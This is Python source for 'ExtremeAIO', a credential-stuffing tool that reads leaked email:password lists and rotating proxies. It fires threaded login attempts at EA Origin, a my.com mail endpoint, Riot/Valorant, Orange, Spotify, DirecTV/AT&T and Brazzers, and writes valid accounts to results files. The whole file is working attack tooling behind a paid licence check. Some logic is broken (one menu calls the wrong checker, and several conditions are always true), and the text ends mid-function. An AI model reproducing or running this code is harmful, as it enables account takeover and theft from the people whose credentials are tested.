import requests, threading, re, time, sys, os, random, webbrowser, ctypes, json, hashlib, subprocess, pypresence, tkinter
from colorama import Fore, init
from re import search
from tkinter import filedialog, messagebox
from time import gmtime, strftime
from pypresence import Presence
lista_mesaje = ["Coded by ExtremeDev"]
logo = f""" 
                        {Fore.GREEN}███████ ██   ██ ████████ ██████  ███████ ███    ███ {Fore.RED}███████  █████  ██  ██████ {Fore.WHITE} 
                        {Fore.GREEN}██       ██ ██     ██    ██   ██ ██      ████  ████ {Fore.RED}██      ██   ██ ██ ██    ██{Fore.WHITE} 
                        {Fore.GREEN}█████     ███      ██    ██████  █████   ██ ████ ██ {Fore.RED}█████   ███████ ██ ██    ██{Fore.WHITE} 
                        {Fore.GREEN}██       ██ ██     ██    ██   ██ ██      ██  ██  ██ {Fore.RED}██      ██   ██ ██ ██    ██{Fore.WHITE} 
                        {Fore.GREEN}███████ ██   ██    ██    ██   ██ ███████ ██      ██ {Fore.RED}███████ ██   ██ ██  ██████ {Fore.WHITE} 
                                                                                                      """

contact_us = 'link-here'

ByPassLogin = True

module = ""

root = tkinter.Tk()
root.withdraw()

today = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
if not os.path.exists("results"):
    os.makedirs(f"results")
if not os.path.exists(f"results/{today}"):
    os.makedirs(f"results/{today}")

time22 = time.time()
err = False
client_id = 'client id'
RPC = Presence(client_id=client_id)
try:
    RPC.connect()
    RPC.update(large_image='image_name_here', details='Coded by ExtremeDev', start=time22)
except (pypresence.InvalidPipe, pypresence.InvalidID, pypresence.PyPresenceException):
    err = True

mesaje = random.choice(lista_mesaje)
proxylist = []
emails = []
passwords = []
username = ""

login_status = 0
register_status = 0
apikey = ""
secret = ""
aid = ""
version1 = "1.0"
random1 = "python"
BUF_SIZE = 65536
md5 = hashlib.md5()
filehash = md5.hexdigest()
init()
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()


cpm1, cpm, good, bad, checked, errors, banned = 0, 0, 0, 0, 0, 0, 0

def login_menu():
    os.system('cls')
    os.system("title ExtremeAIO - Login")
    print()
    print(logo + Fore.WHITE)
    print()
    print()
    print(f"  [{Fore.GREEN}1{Fore.WHITE}] Login")
    print(f"  [{Fore.GREEN}1{Fore.WHITE}] Register")
    option = input("\n")
    if option == "1":
        login()
    elif option == "2":
        register()
    else:
        login_menu()

def logincheck():
    global username
    if os.path.exists("login.extremedev"):
        with open("login.extremedev", "r+") as dev:
            extreme = dev.readlines()
            for line in extreme:
                cont = re.search(r'\"Login\":\"(.*?):(.*?)\"', line).groups(2)
                data = {
                    "type": "login",
                    "aid": aid,
                    "random": random1,
                    'apikey': apikey,
                    "secret": secret,
                    "username": cont[0],
                    "password": cont[1],
                    "hwid": hwid
                }
                headers = {"User-Agent": "AuthGG"}
                with requests.Session() as sess:
                    request_2 = sess.post('https://api.auth.gg/version2/api.php', headers=headers, data=data)
                    if "success" in request_2.text:
                        os.system('cls')
                        os.system("title ExtremeAIO - Login")
                        print()
                        print(logo + Fore.WHITE)
                        print()
                        print(Fore.MAGENTA + " Trying to login on ExtremeAIO servers.." + Fore.WHITE)
                        time.sleep(1)
                        print("\n  Welcome back, {}!".format(cont[0]))
                        username = cont[0]
                        time.sleep(2)
                        menu()
                    else:
                        if "invalid_details" in request_2.text:
                            print("\n  Please check your credentials!")
                        elif "invalid_hwid" in request_2.text:
                            print("\n  Invalid HWID, please do not attempt to share accounts!")
                        elif "hwid_updated" in request_2.text:
                            print("\n  Your HWID has been updated, relogin!")
                        elif "time_expired" in request_2.text:
                            print("\n  Your subscription has expired!")
                        elif "net_error" in request_2.text:
                            print("\n  Something went wrong!")
                        else:
                            print("\n  Something went wrong!")
                        time.sleep(2)
                        os._exit(0)


    else:
        login_menu()

def login():
    if login_status == 0:
        os.system('cls')
        os.system("title ExtremeAIO - Login")
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        username = input("  Enter Username: ")
        password = input("  Enter Password: ")
        data = {
            "type": "login",
            "aid": aid,
            "random": random1,
            'apikey': apikey,
            "secret": secret,
            "username": username,
            "password": password,
            "hwid": hwid
        }
        headers = {"User-Agent": "AuthGG"}
        with requests.Session() as sess:
            request_2 = sess.post('https://api.auth.gg/version2/api.php', headers=headers, data=data)
            if "success" in request_2.text:
                with open("login.extremedev", "a+") as dev:
                    dev.write("\"Login\":\"{}:{}\"".format(username, password))
                print("\n  Welcome back, {}!".format(username))
                time.sleep(2)
                menu()
            else:
                if "invalid_details" in request_2.text:
                    print("\n  Please check your credentials!")
                elif "invalid_hwid" in request_2.text:
                    print("\n  Invalid HWID, please do not attempt to share accounts!")
                elif "hwid_updated" in request_2.text:
                    print("\n  Your HWID has been updated, relogin!")
                elif "time_expired" in request_2.text:
                    print("\n  Your subscription has expired!")
                elif "net_error" in request_2.text:
                    print("\n  Something went wrong!")
                else:
                    print("\n  Something went wrong!")
                time.sleep(2)
                os._exit(0)
    else:
        messagebox.showerror("ExtremeAIO", "Our panels are down, please contact any admin..")
        os._exit(0)  

def register():
    os.system('cls')
    os.system("title ExtremeAIO - Register")
    if register_status == 0:
        os.system('cls')
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        token = input("  Please enter token: ")
        os.system('cls')
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        email = input("  Please enter email: ")
        os.system('cls')
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        username = input("  Please enter username: ")
        os.system('cls')
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        password = input("  Please enter password: ")
        headers = {"User-Agent": "AuthGG"}
        data = {
            "type": "register",
            "aid": aid,
            "random": random1,
            'apikey': apikey,
            "secret": secret,
            "username": username,
            "password": password,
            "email": email,
            "token": token,
            "hwid": hwid
        }
        try:
            with requests.Session() as sess:
                request_3 = sess.post('https://api.auth.gg/version2/api.php', data=data, headers=headers)
                if "success" in request_3.text:
                    print(f"\n {username}, you have successfully registered!")
                    time.sleep(2)
                    os._exit(0)
                else:
                    if "invalid_token" in request_3.text:
                        print("\n Token invalid or already used")
                    elif "invalid_username" in request_3.text:
                        print("\n Username already taken, please choose another one")
                    elif "email_used" in request_3.text:
                        print('\n Email is invalid or in use!')
                    else:
                        print("\n Something went wrong!")
                    time.sleep(2)
                    os._exit(0)
        except:
            messagebox.showerror("ExtremeAIO", "Our panels are down, please contact any admin..")
            os._exit(0)      
    else:
        messagebox.showerror("ExtremeAIO", "Our panels are down, please contact any admin..")
        os._exit(0)

def load_accounts():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    input(" Press ENTER to select combos..")
    fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file (http/s)',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    with open(fileNameCombo.name,'r+') as f:
        for x in f.readlines():
            try:
                emails.append(x.split(":")[0].replace('\n',''))
                passwords.append(x.split(":")[1].replace("\n",''))
            except Exception:
                pass
def load_proxies():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    input(" Press ENTER to select proxies..")
    fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file (http/s)',
                                filetype=((".txt", "*.txt"), ("All files", "*.txt")))
    with open(fileNameProxy.name, 'r+') as n:
        proxypath = n.readlines()
        for linie_proxy in proxypath:
            linie_prox = linie_proxy.split()[0]
            proxylist.append(linie_prox)

def screen():
    global bad, good, cpm, cpm1, errors, checked, banned, module
    os.system("cls")
    cpm1 = cpm
    cpm = 0
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO | Checked: {}/{} | Good: {} | Bad: {} |".format(checked, len(emails), good, bad))
    print("\n" + logo + "\n")
    print("                                     {}ExtremeAIO{} - \"{}\"".format(Fore.GREEN, Fore.WHITE, mesaje))
    print(" Checked - [{}/{}]".format(checked, len(emails)))
    print(" Good - [{}]".format(Fore.GREEN + str(good) + Fore.WHITE))
    print(" Bad - [{}]".format(Fore.RED + str(bad) + Fore.WHITE))
    print(" Ip Banned - [{}]".format(Fore.CYAN + str(banned) + Fore.WHITE))
    print(" Errors - [{}]".format(Fore.LIGHTBLACK_EX + str(errors) + Fore.WHITE))
    print(" CPM - [{}]".format(Fore.BLUE + str(cpm1*60) + Fore.WHITE))
    time.sleep(1)
    threading.Thread(target=screen, args=()).start()

#Game

def Origin_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers123 = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }
            f = sess.get("https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834", headers=headers123)

            xd = f.headers['SelfLocation']
            content = f"email={email}&password={password}&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on"

            headers = {
                "content-type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }

            r = sess.post(xd, data=content, headers=headers)
            if "latestSuccessLogin" in r.text:
                good+=1
                checked+=1
                cpm+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "Your credentials are incorrect or have expired" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass
def Origin():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE} Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE} Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Origin_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Mail_Access_check(email, password, proxylist):
    global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            r = sess.get("https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={}&Password={}".format(email, password), headers={"User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"})
            if "Ok=0" in r.text:
                bad+=1
                checked+=1
                cpm+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "Ok=1" in r.text:
                good+=1
                checked+=1
                cpm+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                checked+=1
                cpm+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except:
        errors+=1
def Mail_Access():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Mail_Access_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def uPlay():
    print("This option is off..")
    time.sleep(2)
    menu()
def Valorant_check(email, password, proxylist):
    global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            login_content = f"client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|{email}&password={password}&scope=openid offline_access lol ban profile email phone"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
                "Pragma": "no-cache"
            }

            r = sess.post("https://auth.riotgames.com/token", data=login_content, headers=headers)
            if "access_token" in r.text:
                good+=1
                checked+=1
                cpm+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "invalid_credentials" in r.text:
                bad+=1
                checked+=1
                cpm+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                checked+=1
                cpm+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except:
        errors+=1
def Valorant():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Valorant_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Steam():
    print("This option is off..")
    time.sleep(2)
    menu()
def Blizzard():
    print("This option is off..")
    time.sleep(2)
    menu()
# Streaming
def Hulu():
    print("This option is off..")
    time.sleep(2)
    menu()
def Netflix_check(email,password,proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            url = "https://sso.orange.com/WT/userinfo/" 
            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Orange TV_Android_7.2.0-2000_LG_LG-M700N_22_LL-Master3.9.5-1_HL-Sprint7.0.9-3",
                "Accept": "*/*",
                "Pragma": "no-cache",
                "X_OPENTV_PSE": "p_appliTV",
                "X_OPENTV_PE": "pe_appliTV",
                "X_OPENTV_ACTIVECONTEXT": "I",
                "X_OPENTV_PARENT_SESSION_ID": "APP-1804476f-d380-4059-abcc-c23aab59269d",
                "X_OPENTV_DID": "FB7C279E-0B89-E3C9-8503-3C1AEB89D309-DC7F2A58",
                "X-BEARER": "WIFI"

            }
            content = f"wt-email={email}&wt-pwd={password}&serv=OTVSDK&charset=utf_8&info=cooses&wt-cvt=4&wt-mco=MCO%3DOFR" 
            r = sess.post(url, headers=headers, data=content)
            if r.status_code == 403:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "identifiers" in r.text:
                good+=1
                checked+=1
                cpm+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass
def Netflix():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Netflix_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Spotify_check(email,password, proxylist):
    global checked, good, bad, cpm, cpm1, errors, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }

            f = sess.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F", headers=headers)

            csrf = f.cookies.get("csrf_token")

            content = f"remember=true&username={email}&password={password}&csrf_token={csrf}"
            cookies = dict(__bon='MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx') 
            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }

            r = sess.post("https://accounts.spotify.com/api/login", headers=headers, data=content, cookies=cookies)
            if "{\"error\":\"errorInvalidCredentials\"}"in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "{\"displayName\":\"" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            elif "Oops! Something went wrong, please try again or check out our" in r.text:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))     
    except Exception:
        errors+=1
        pass
def Spotify():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Valorant_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Disney():
    print("This option is off..")
    time.sleep(2)
    menu()
def DirectTV():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=DirectTV_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def DirectTV_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            content = f"_dyncharset=UTF-8&_dynSessConf=100695874470150304&isTguardAuthEnabled=true&nflRushHourEnabled=false&loginPage=https%3A%2F%2Fwww.directv.com%2FDTVAPP%2Flogin%2Flogin.jsp&targetURL=https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dtrue%26appID%3Dm93639%26returnURL%3Dhttps%253A%252F%252Fwww.directv.com%252FDTVAPP%252Fauth.jsp%253Fremember%253Dfalse&returnErrorCode=true&loginURL=https%3A%2F%2Fwww.directv.com%2FDTVAPP%2Fauth.jsp%3Fremember%3Dfalse&%2Fatg%2Fuserprofiling%2FProfileFormHandler.landingPageUrl=&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.landingPageUrl=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginSuccessUrl=%2FDTVAPP%2Fmydirectv%2Faccount%2FmyOverview.jsp&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginSuccessUrl=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginErrorUrl=%2FDTVAPP%2Flogin%2Flogin.jsp&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginErrorUrl=+&register=false&_D%3Aregister=+&userid={email}&password={password}&_D%3Aremember=+&register=false&_D%3Aregister=+&_DARGS=%2FDTVAPP%2Fglobal%2Fold%2FloginBox.jsp"

            headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                "Pragma":"no-cache", 
                "Accept":"*/*" 
            }

            r = sess.post("https://cprodmasx.att.com/commonLogin/igate_wam/login.do?_DARGS=/DTVAPP/global/old/loginBox.jsp", data=content, headers=headers)

            if "Please enter a valid password" or "\"termsandconditions\",\"width=618, height=485, resizable=yes, scrollbars=yes\")'>What's this?</a>" or "Here's your Access ID. It's the same as your DIRECTV ID. You'll keep your existing password." or "Looks like you signed in with your Yahoo ID. That ID doesn't work with" or "&response_code=E.01.03.015" or "&response_code=E.01.03.016" or "&response_code=E.01.03.050" or "&response_code=E.01.01.420" or "&response_code=E.01.01.410" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "<h1>Multiple Accounts Found</h1>" or "TATS-TokenID" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "403 ERROR" or "Proxy Authorization Required" or "proxy node error" or "Please login to browse the internet" or "400 Bad Request" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

            else:
                banned+=1
                cpm+=1
                checked+=1
                open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

    except Exception:
        errors+=1
        pass

def Brazzers():
    global username
    global proxy_type
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW("ExtremeAIO - Made with love")
    print("\n" + logo + "\n")
    print("                                     ExtremeAIO - \"{}\"".format(mesaje))
    print()
    print(" Hello, {}, please select proxy type..".format(username))
    print(f" [{Fore.GREEN}1{Fore.WHITE} Http/s")
    print(f" [{Fore.GREEN}2{Fore.WHITE}Socks4")
    print(f" [{Fore.GREEN}3{Fore.WHITE}Socks5")
    proxy_type = int(input(" "))
    print(" How many threads do you want to use?")
    threads_c = int(input(" "))
    screen()
    num = 0
    while 1:
        if threading.active_count() < int(threads_c):
            if len(emails) > num:
                threading.Thread(target=Brazzers_check, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
def Brazzers_check(email, password, proxylist):
    global errors, good, bad, cpm, checked, banned, proxy_type
    try:
        with requests.Session() as sess:
            proxy = random.choice(proxylist)
            if proxy_type == "1":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
            elif proxy_type == "2":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy)}
            elif proxy_type == "3":
                proxy_for_check = {'http': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}

            sess.proxies = proxy_for_check
            headers = {
                "content-type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache", 
            }
            content = ""

            f = sess.get("https://ma.brazzers.com/access/login/", headers=headers, data=content)

            url = "https://ma.brazzers.com/access/submit/"
            content = f"username={email}&password={password}&g-recaptcha-response=6LeY4gsUAAAAANITYkv2gPI8eEu8am3TCOr4B6j7&rememberme=on" 

            headers = {
                "content-type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache",
                "referer":"https://ma.brazzers.com/access/login/", 
                "origin":"https://ma.brazzers.com" 
            }
            r = sess.post(url, data=content, headers=headers)
            if ">Login Error</" in r.text:
                bad+=1
                cpm+=1
                checked+=1
                open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
            elif "Fallback Procedure - Brazzers" in r.text:
                good+=1
                cpm+=1
                checked+=1
                open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
